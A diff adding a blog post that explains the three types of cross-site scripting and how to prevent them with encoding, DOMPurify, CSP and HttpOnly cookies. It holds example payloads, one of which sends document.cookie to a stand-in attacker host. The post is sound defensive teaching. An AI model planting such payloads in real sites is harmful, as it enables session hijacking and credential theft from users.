@@ -1,0 +1,144 @@
+---
+title: "XSS Attacks Explained — And How to Defend Against Them"
+description: "Cross-Site Scripting is one of the most common web vulnerabilities. Here's how it works, why it's dangerous, and the exact techniques you need to prevent it in your apps."
+date: "2026-05-27"
+tags: ["Security", "Web Dev", "JavaScript"]
+coverImage: "https://ik.imagekit.io/Ariyaman/blog/image_yXZLXded1O?updatedAt=1746355276815"
+---
+
+Cross-Site Scripting — or **XSS** — is consistently in OWASP's Top 10 list of the most critical web application security risks. Despite being well-documented, it still shows up in production apps every day. In this post I'll explain what it is, how attackers exploit it, and exactly what you need to do to stop it.
+
+## What Is XSS?
+
+XSS is a vulnerability where an attacker is able to inject malicious JavaScript into a web page that is then executed in the browser of another user.
+
+The critical word is **another user's browser**. The attacker doesn't run the script on your server — they trick your server into serving the script to your users. From that point, the script runs with full access to the victim's DOM, cookies, and session storage.
+
+## The Three Types of XSS
+
+### 1. Stored (Persistent) XSS
+
+This is the most dangerous type. The attacker injects a script into a field that gets **saved to your database** — like a comment, a username, or a bio field — and the script is then rendered for every user who views that content.
+
+**Example attack payload:**
+```html
+<script>
+  fetch('https://evil.example.com/steal?c=' + document.cookie);
+</script>
+```
+
+If your app renders this from the database without sanitising it, every visitor to that page silently sends their session cookies to the attacker.
+
+### 2. Reflected XSS
+
+Here the payload isn't stored — it's embedded in a URL and reflected back in the response. A common vector is a search field:
+
+```
+https://yoursite.com/search?q=<script>alert('xss')</script>
+```
+
+If the server outputs `q` directly into the HTML without encoding, the script executes. Attackers send these crafted URLs to victims via phishing emails.
+
+### 3. DOM-based XSS
+
+This is entirely client-side. The vulnerability lives in JavaScript that reads from an unsafe source (like `location.hash` or `document.referrer`) and writes it to the DOM unsafely.
+
+```js
+// ❌ Dangerous
+document.getElementById('output').innerHTML = location.hash.slice(1);
+```
+
+If a user visits `https://yoursite.com#<img src=x onerror=alert(1)>`, the script runs.
+
+## How Attackers Use XSS in Practice
+
+A successful XSS attack can:
+
+- **Steal session cookies** and hijack accounts (if cookies aren't `HttpOnly`)
+- **Log keystrokes** on login forms to capture passwords
+- **Redirect users** to phishing pages that look identical to yours
+- **Make authenticated requests** on behalf of the victim (CSRF-like behaviour)
+- **Inject fake login forms** into the page to harvest credentials
+
+## How to Prevent XSS
+
+### 1. HTML-encode all output
+
+Never insert user-controlled data directly into HTML. Every framework has a safe way to do this:
+
+```jsx
+// ✅ React escapes by default — this is safe
+const name = "<script>alert('xss')</script>";
+return <p>{name}</p>;
+
+// ❌ This bypasses React's protection — NEVER do this with untrusted input
+return <p dangerouslySetInnerHTML={{ __html: name }} />;
+```
+
+### 2. Sanitise when you need rich HTML
+
+Sometimes you genuinely need to render user-submitted HTML (e.g. a rich-text editor). In that case, sanitise it with a trusted library **before** rendering:
+
+```js
+import DOMPurify from 'dompurify';
+
+const cleanHTML = DOMPurify.sanitize(userSubmittedHTML);
+// Now safe to render
+element.innerHTML = cleanHTML;
+```
+
+`DOMPurify` strips all dangerous tags and attributes while keeping safe formatting.
+
+### 3. Set a strict Content Security Policy (CSP)
+
+A CSP header tells the browser which scripts are allowed to run. Even if an attacker injects a script tag, the browser will refuse to execute it:
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self';
+```
+
+In Next.js, you can set headers in `next.config.mjs`:
+
+```js
+const nextConfig = {
+  async headers() {
+    return [
+      {
+        source: '/(.*)',
+        headers: [
+          {
+            key: 'Content-Security-Policy',
+            value: "default-src 'self'; script-src 'self'",
+          },
+        ],
+      },
+    ];
+  },
+};
+```
+
+### 4. Use `HttpOnly` and `Secure` cookie flags
+
+```
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+`HttpOnly` makes cookies invisible to JavaScript entirely — meaning `document.cookie` returns nothing. Even if XSS occurs, the attacker cannot steal session tokens via script.
+
+### 5. Validate and encode on the server too
+
+Client-side validation can be bypassed. Always re-validate on the server and store plain text in the database rather than raw HTML wherever possible.
+
+## Quick Checklist
+
+- [ ] Never use `.innerHTML`, `document.write`, or `eval()` with user data
+- [ ] Sanitise all rich HTML with DOMPurify before rendering
+- [ ] Set a Content Security Policy header
+- [ ] Mark session cookies as `HttpOnly` and `Secure`
+- [ ] Audit third-party scripts — they can be XSS vectors too
+
+## Summary
+
+XSS works by tricking your app into serving attacker-controlled JavaScript to your users. The fix is always the same: **never trust user input**, encode everything on output, and layer your defences with CSP headers and secure cookies.
+
+React's JSX escapes output by default which removes most XSS risk, but the moment you reach for `dangerouslySetInnerHTML` without a sanitiser, you're wide open.
